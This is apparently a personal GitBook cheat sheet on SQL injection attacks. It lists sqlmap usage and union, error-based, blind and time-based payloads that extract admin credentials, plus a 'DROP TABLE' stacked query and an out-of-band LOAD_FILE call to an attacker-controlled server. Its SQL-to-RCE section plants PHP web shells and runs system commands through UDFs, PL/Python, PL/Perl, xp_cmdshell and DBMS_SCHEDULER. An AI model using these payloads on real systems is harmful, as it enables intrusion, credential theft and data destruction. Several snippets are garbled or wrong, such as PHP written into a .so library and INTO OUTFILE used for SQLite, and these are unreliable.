---
description: Server-Side Attacks
---

# SqlI

<figure><img src="../../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

## WriteUps

[Tricks](https://www.notion.so/Tricks-24078b2152854f11896181383e961288?pvs=21)

[Portswigger](https://www.notion.so/Portswigger-1e21202e068540619f1f1b0c3802be0a?pvs=21)

**@Mysql**

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

[Information\_schema](https://www.notion.so/Information\_schema-79ab4c7abc2a4892beb49e4c58fc31a8?pvs=21)

## How use Sqlmap

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

```bash
sqlmap -r req.txt --dbs --random-agent --risk 3 --level 5
```

## How SQL Injection Works

At its core, SQLi exploits vulnerabilities in the input validation framework of an application.

When user inputs are not properly sanitized, an attacker can inject malicious SQL queries that the application will execute without question.

This can result in unauthorized access to sensitive information, data manipulation, and even complete control over the database.

### 1. Detection of SQL Injection Vulnerabilities

#### **Reconnaissance** => backend Use + DBMS

Detecting SQL Injection vulnerabilities involves testing for unexpected or unhandled inputs.

Techniques such as submitting single quotes (<mark style="color:red;">`'`</mark>), double quotes (<mark style="color:red;">`"`</mark>), or other SQL control characters can reveal how an application processes input.

Observing error messages or application responses can provide clues about the underlying SQL query structure, indicating potential injection points.

### Entry Point Detection Examples:

* **Confirming with Logical Operations:** Using statements like <mark style="color:red;">**`1' OR '1'='1`**</mark> can help determine if an application is vulnerable by altering the query logic.
* **Timing Attacks:** Introducing deliberate delays (`SLEEP` functions) in queries can help identify blind SQL Injection vulnerabilities by observing response times.

### 2. Exploiting SQL Injection&#x20;

## in band

Once a vulnerability is identified, exploiting it can take various forms depending on the database and the nature of the vulnerability:

### _**Union Based SQL Injection:**_

_**Identifying the Number of Columns:**_

Both <mark style="color:red;">**`ORDER BY`**</mark> and <mark style="color:red;">`GROUP BY`</mark> can be exploited to identify the number of columns in the query's result set. This is crucial for constructing a successful <mark style="color:red;">**`UNION SELECT`**</mark> attacks.

**Scenario:** You’ve identified a page that displays user details based on their ID from the URL parameter `?id=1`.

_**Vulnerable SQL Query:**_

```sql
SELECT name, age FROM users WHERE id = $_GET['id'];
```

_**Exploitation**_**:**

```sql
?id=1 UNION SELECT username, password FROM admin_users
```

In this example, the attacker appends a `UNION SELECT` query to retrieve usernames and passwords from an `admin_users` table, bypassing the intended query's limitations.

### &#x20;Error-Based SQL Injection:

It involves generating database errors to extract information from the error messages.

**Scenario:** An application displays detailed error messages when SQL queries fail.

_**Vulnerable SQL Query:**_

```sql
SELECT title, content FROM articles WHERE id = $_GET['id'];
```

_**Exploitation:**_

```sql
?id=1 AND (SELECT COUNT(*) FROM admin_users) = CAST('' AS INTEGER)
```

This payload causes a type conversion error, potentially revealing information about the database structure or data through error messages.

#### Exploiting blind SQL injection by triggering conditional errors <a href="#exploiting-blind-sql-injection-by-triggering-conditional-errors" id="exploiting-blind-sql-injection-by-triggering-conditional-errors"></a>

To see how this works, suppose that two requests are sent containing the following <mark style="color:red;">**`TrackingId`**</mark> cookie values in turn:

```bash
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

These inputs use the <mark style="color:red;">**`CASE`**</mark> keyword to test a condition and return a different expression depending on whether the expression is <mark style="color:red;">**true**</mark>:

Using this technique, you can retrieve data by testing one character at a time:

**`xyz' AND (SELECT`` `**<mark style="color:red;">**`CASE`**</mark>**` ``WHEN (Username = '`**<mark style="color:red;">**`Administrator`**</mark>**`' AND`` `**<mark style="color:red;">**`SUBSTRING`**</mark>**`(Password, 1, 1) > 'm')`` `**<mark style="color:red;">**`THEN`**</mark>**` ``1/0`` `**<mark style="color:red;">**`ELSE`**</mark>**` ``'a' END FROM Users)='a`**

## Blind

No data is transferred from the web application to the attacker, so the attacker sends data to the database, true or false questions, and observes the response.

**Scenario:** The application does not display error messages or query results, but changes in response can be observed.

### _**Boolean-Based Exploitation:**_

```sql
?id=1 AND (SELECT SUBSTRING(password, 1, 1) FROM admin_users WHERE username = 'admin') = 'a'
```

This method involves iteratively guessing the password character by character, and observing the application’s behavior (e.g., response time or content changes) to confirm the guess.

### _**Time-Based Exploitation:**_

```sql
?id=1 AND IF((SELECT SUBSTRING(password, 1, 1) FROM admin_users WHERE username = 'admin') = 'a', sleep(5), 'false')
```

This payload uses a conditional time delay to confirm the password character, exploiting the database’s response time.

> D. Stacked Queries SQL Injection

**Key Detail:** The database and interface must support multiple queries executed in a single database call.

**Example:**

```
?id=1; DROP TABLE users --
```

Stacked queries allow an attacker to execute additional queries after the initial, legitimate query. This is highly dependent on the database and the programming language’s database driver or ORM the application uses.

## &#x20;Out-of-band (OOB)

**Key Detail:** The database server must be able to make DNS or HTTP requests to external servers.

**Example:**

```
?id=1; SELECT LOAD_FILE('\\\\\\\\attacker-controlled-server.com\\\\data')
```

OOB techniques rely on the database server’s ability to communicate with external systems, allowing data exfiltration via DNS queries or HTTP requests.

> F. Advanced SQL Injection Techniques

* **Authentication Bypass:** Attackers might inject SQL to bypass login algorithms, often targeting the query logic.**Mitigation:** Employ strong input validation and parameterized queries for authentication mechanisms.
* **Inferential SQL Injection:** Similar to Blind SQLi, this method involves making logical guesses about the data structure and content.**Mitigation:** Use WAFs and ensure applications do not reveal any hints in their responses.
* **Second Order SQL Injection:** Occurs when user input is stored and later executed as a SQL query.**Mitigation:** Always sanitize user inputs, even when they are not immediately used in database queries.

## SQl To RCE or Types of  DB Get RCE

### 1.MySQL

* LOAD\_FILE() => Get file in System
* INTO OUTFILE => Write php code in server or any lang&#x20;
* UDF (User Defined Functions)&#x20;

Example

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

go to the browser and use <mark style="color:red;">**`shell.php?cmd=ls`**</mark>

**UDF**&#x20;

* use into outfile
* make shared library using C (.so, .dll) <mark style="color:red;">**.so**</mark> in Linux / <mark style="color:red;">**.dll**</mark> in Windows

Example in Linux

```c
#include <stdio.h>
#include <stdlib.h>


void sys_exec(const char *cmd) {
    system(cmd);
}

```

* Load Library to system

{% code overflow="wrap" %}
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/usr/lib/mysql/plugin/udf.so';
```
{% endcode %}

* create function to exec command&#x20;

```sql
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';
```

```sql
SELECT sys_exec('id')
```

### 2.PostgreSQL

COPY => Use to Write in Files

PG\_READ\_FILE() => Using to READ Files

COPY TO PROGRAM => Using to execute command in  System

{% code overflow="wrap" %}
```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'echo "<?php system($_GET["cmd"]); ?>" > /var/www/html/shell.php';

```
{% endcode %}

```sql
COPY (SELECT '') TO PROGRAM 'ls /tmp';
```

go to the browser and use <mark style="color:red;">**`shell.php?cmd=ls`**</mark>

#### PL/Python

1. enable Pl/Python

```
CERATE EXTENSION plpythonu;
```

2\. Write Function to execute os.system

```plsql
CREATE FUNCTION exec_system(cmd text) RETURNS void AS $$
import os
os.system(cmd)
$$ LANGUAGE plpythonu;
```

3. now can call function to EXEC to system command

```plsql
SELECT exec_system('ls /tmp');
```

#### PL/Perl

```sql
CREATE EXTENSION plperl;
```

```sql
sqlCopy codeCREATE FUNCTION exec_perl_system(cmd text) RETURNS void AS $$
system(cmd);
$$ LANGUAGE plperl
#exec command
SELECT exec_perl_system('ls /tmp');

```



### 3. MSSQL

xp\_cmdshell => EXECUTE command in system

```sql
EXEC xp_cmdshell 'dir';
```

### 4. Oracle&#x20;

DBMS\_SCHEULER => schedule command in the system

```sql
BEGIN
  DBMS_SCHEDULER.create_job(
    job_name => 'my_job',
    job_type => 'EXECUTABLE',
    job_action => '/bin/ls',
    start_date => SYSTIMESTAMP,
    enabled => TRUE
  );
END;
```

### 5. **SQLite**

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

